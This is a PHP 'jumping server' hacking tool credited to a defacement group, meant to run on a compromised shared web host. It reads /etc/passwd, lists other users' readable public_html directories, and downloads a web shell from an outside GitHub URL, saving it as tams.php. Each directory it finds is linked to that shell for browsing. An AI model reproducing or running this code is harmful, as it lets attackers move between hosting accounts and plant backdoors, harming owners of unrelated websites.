<?php echo '<html><head><title>The Alien Jumping Server - '.getenv("HTTP_HOST").'</title></head><body>';
echo'<center><p><b><font size="6" color="#008080" face="Calibri">The Alien Jumping Server 1.0 <br></font><font size="4" color="#800000" face="Calibri">Created by The Alien | 2017 - Team Pak Cyber Ghosts</font></b></p>';

($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<font size="4" color="#000000" face="Calibri"><b>Error: Safe_mode = On</b></font>');

?>
<link rel="shortcut icon" href="http://www.ijazurrahim.cf/PCGLOGO.png" type="image/png">
<style>
body{background:black;color:white;font-family:MS Serif;}
.submitstyle{font-size:15px;background:black;color:white;border:2px solid green;border-radius:10px;moz-border-radius:10px;font-weight:bold;font-family:Arial;height:35px;cursor:pointer;}
.submitstyle:hover{cursor:pointer;box-shadow:0px 0px 5px 5px green;background-color:green;border-color:white;}
a{color:green;text-decoration:none;}
a:hover{font-weight:bold;}
</style>

<style> 
   
#cf {
  position:relative;
  height:420px;
  width:420px;
  margin:0 auto;
}

#cf img {
  position:absolute;
  left:0;
  -webkit-transition: opacity 0.5s ease-in-out;
  -moz-transition: opacity 0.5s ease-in-out;
  -o-transition: opacity 0.5s ease-in-out;
  transition: opacity 0.5s ease-in-out;
}

#cf img.top:hover {
  opacity:0;
}
</style>


<div id="cf">
<a href="https://www.facebook.com/pakcyberghostsofficial/" >
  <img class="bottom" src="http://www.ijazurrahim.cf/PCG1.png" />
  <img class="top" src="http://www.ijazurrahim.cf/PCG.png" />
</a>
</div>
<br/><br/>
<form method=post>
<input class=submitstyle type=submit name=jumping value="Start Scanning" />
</form>


<?php

if(isset($_POST['jumping']))
{
	function shell()
	{
		set_time_limit(0);
@$passwd = fopen('/etc/passwd','r');
if (!$passwd) 
{
	die('<font size="4" color="#000000" face="Calibri"><b>[-] Error : Coudn`t Read /etc/passwd</b></font>');
 }
$pub = array();
$users = array();
$conf = array();
$i = 0;
while(!feof($passwd))
{
	$str = fgets($passwd);
	if ($i > 100)
	{
		$pos = strpos($str,':');
		$username = substr($str,0,$pos);
		$dirz = '/home/'.$username.'/public_html/';
		if (($username != '')) 
		{
			if (is_readable($dirz))
			{
				array_push($users,$username);
				array_push($pub,$dirz);
			}
		}
	}
  $i++;
}
echo '<p><font size="4" color="white" face="Calibri"><br><br>Dedicated To My All Friends</font><font size="3" color="#800000" face="Calibri"><br><marquee>Thanks to : Mr.XaaD | Inj3ctor Osman | An0n 3xPloiTeR | Rizi_HaXoR | The Alien | N!NJ@ X | Xam 3xploiTeR | Mr.x3r0 And All Muslim Hackers</marquee></font></p><br><font size="3" color="Green" style="text-shadow:5px 5px 5px 5px red;" face="Calibri">         <center>[-]==================[ START ]==================[-] <br><br></font>';
foreach ($users as $user)
{
	echo "<a href='tams.php?y=/home/$user/public_html/'><font size='4' color='#ee0808' face='Calibri'> [+] /home/$user/public_html/ [+]</font></a><br/>";
} 
echo "\n <font size='3' color='#008080' face='Calibri'><br>[-]==================[ FINISH ]==================[-] <br></font>\n";
echo "\n <font size='3' color='#Green' face='Calibri'>[+] Scan has been completed | Thank you for using this tools [+]</font></center></center>\n"; 
echo '</body></html>';
	}
	
	
	
	
	
	if(file_exists("tams.php"))
	{
		shell();
	}
	else
	{
		$get = file_get_contents("https://raw.githubusercontent.com/IJAZ9913/TheAlien/master/TheAlienMiniShell");
	$put = file_put_contents("tams.php", $get);
	shell();
	}
}
else
{
	echo"";
}
?>
